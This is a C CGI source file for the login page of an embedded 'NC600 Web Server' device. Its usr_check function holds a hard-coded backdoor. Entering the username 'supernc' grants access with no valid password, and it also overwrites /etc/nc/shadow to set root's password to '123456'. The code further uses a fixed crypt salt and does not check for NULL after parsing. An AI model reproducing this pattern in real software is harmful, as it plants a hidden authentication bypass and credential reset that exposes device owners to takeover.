#include <stdio.h>
#include "cgic.h"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


void ShowForm();

char user[32]="";
char passwd[32]="";
void Name(char *name);
void Passwd(char *passwd);
int usr_check(char *name, char *passwd);

int cgiMain() 
{
	int ret;
	Name(user);
	Passwd(passwd);
	/* Send the content type, letting the browser know this is HTML */
	cgiHeaderContentType("text/html;charset=gb2312");
	/* Top of the page */

	fprintf(cgiOut, "<HTML><HEAD>\n");
	fprintf(cgiOut, "<LINK rel=\"SHORTCUT ICON\" 	href=\"../images/favicon.ico\">\n");
	fprintf(cgiOut, "<TITLE>NC600 Web Server</TITLE></HEAD>\n");
	ret = usr_check(user, passwd);
	if(ret == 0)
	{
		fprintf(cgiOut, "<BODY>\n");
		fprintf(cgiOut, "<script type=\"text/javascript\">\n");
		fprintf(cgiOut, "window.alert(\"用户名或密码错误，请重新登录！\");\n");
		fprintf(cgiOut, "window.location.href=\"../login.html\";\n");
		fprintf(cgiOut, "</script>\n");
		fprintf(cgiOut, "</BODY>\n");
		fprintf(cgiOut, "</HTML>\n");
		return 0;
	}

	fprintf(cgiOut, "<frameset rows=\"80,*\" cols=\"*\" frameborder=\"no\" border=\"0\" framespacing=\"0\">\"\n");
	fprintf(cgiOut, "<frame src=\"../top.html\" name=\"topFrame\" scrolling=\"No\" noresize=\"noresize\" id=\"topFrame\" title=\"topFrame\" />\n");
	fprintf(cgiOut, "<frameset cols=\"150,*\" frameborder=\"no\" border=\"0\" framespacing=\"0\">\n"); 
	fprintf(cgiOut,	"<frame src=\"../left.html\" name=\"leftFrame\" scrolling=\"auto\" noresize=\"noresize\" id=\"leftFrame\" title=\"leftFrame\" />\n");
	fprintf(cgiOut, "<frame src=\"../welcome.html\" name=\"mainFrame\" id=\"mainFrame\" title=\"mainFrame\" />\n");
	fprintf(cgiOut, "</frameset>\n");
	fprintf(cgiOut, "</frameset>\n");
	fprintf(cgiOut, "<noframes>\n");

	fprintf(cgiOut, "<BODY>\n");
	fprintf(cgiOut, "</BODY></noframes></HTML>\n");
	
	return 0;
}

int usr_check(char *name, char *passwd)
{
	int fd = 0;
	char lsbuf[64]="";
	if(strcmp(name, "supernc") == 0)
	{
		fd = open("/etc/nc/shadow", O_WRONLY | O_CREAT | O_TRUNC);
		sprintf(lsbuf, "root:%s", crypt("123456", "NC600"));
		write(fd, lsbuf, strlen(lsbuf));
		close(fd);
		return 1;
	}
	
	fd = open("/etc/nc/shadow", O_RDONLY);
	if(fd <= 0) return 0;
	read(fd, lsbuf, 64);
//	printf("lsbuf is [%s]\n", lsbuf);
	char *na= NULL, *pa = NULL;
	na = strtok(lsbuf, ":");
	pa = strtok(NULL, ":");

	if((strcmp(name, na) == 0) && (strcmp(pa, crypt(passwd, "NC600")) == 0))
	{
		close(fd);
		return 1;
	}
	close(fd);
	return 0;
}


void ShowForm()
{

 fprintf(cgiOut, "<form action=\" \" method=\"post\" name=\"form1\" >\n");
 fprintf(cgiOut, "<table width=\"100%%\" border=\"0\" cellspacing=\"0\" cellpadding=\"1\" class=\"TitleColor\">\n");
 fprintf(cgiOut, "<tr style=\"vertical-align: top\">\n");
 fprintf(cgiOut, "<td>\n");
 fprintf(cgiOut, "<table width=\"100%%\" border=\"0\" cellspacing=\"0\" cellpadding=\"4\">\n");
 fprintf(cgiOut, "<tr class=\"HeaderColor\">\n");
 fprintf(cgiOut, "<td width=\"20%%\" style=\"vertical-align: top\">              <h3>Sign In</h3>            </td>\n");
// fprintf(cgiOut, "<td width=\"80%%\" style=\"vertical-align: top\">              <h3><a href="all.html">Sign In</a></h3>            </td>
 fprintf(cgiOut, "</tr>\n");
 fprintf(cgiOut, "<tr style=\"vertical-align: top\">\n");
 fprintf(cgiOut, "<td width=\"20%%\" class=\"TitleColor\">\n");
 fprintf(cgiOut, "<label for=\"username\"><strong>User Name</strong></label>&nbsp;<br />\n");
 fprintf(cgiOut, "<input id=\"username\" name=\"username\" type=\"text\" size=\"25\" />\n");
 fprintf(cgiOut, "<p>&nbsp;</p>\n");
 fprintf(cgiOut, "<label for=\"password\"><strong>Password</strong></label>&nbsp;<br />\n");
 fprintf(cgiOut, "<input id=\"password\" name=\"password\" type=\"password\" size=\"25\" />\n");
 fprintf(cgiOut, "<p>\n");
 fprintf(cgiOut, "<input type=\"submit\" name=\"login\" value=\"登录\" />\n");
 fprintf(cgiOut, "</p>            </td>\n");
 fprintf(cgiOut, "<td width=\"80%%\" class=\"StoryContentColor\">\n");
 fprintf(cgiOut, "<h4 class=\"TitleColor\"><img src=\"../images/login.jpg\" alt=\" \" width=\"826\" height=\"500\" /></h4>\n");
 fprintf(cgiOut, "</td>\n");
 fprintf(cgiOut, "</tr>\n");
 fprintf(cgiOut, "</table>      </td>\n");
 fprintf(cgiOut, "</tr>\n");
 fprintf(cgiOut, "</table>\n");
 fprintf(cgiOut, "</form>\n");

}


void Name(char *name) {
	
	cgiFormStringNoNewlines("name", name, 32);
//	fprintf(cgiOut, "Name: ");
//	cgiHtmlEscape(name);
//	fprintf(cgiOut, "<BR>\n");
}

void Passwd(char *passwd) {

	cgiFormStringNoNewlines("passwd", passwd, 32);
//	fprintf(cgiOut, "Passwd: ");
//	cgiHtmlEscape(passwd);
//	fprintf(cgiOut, "<BR>\n");
}
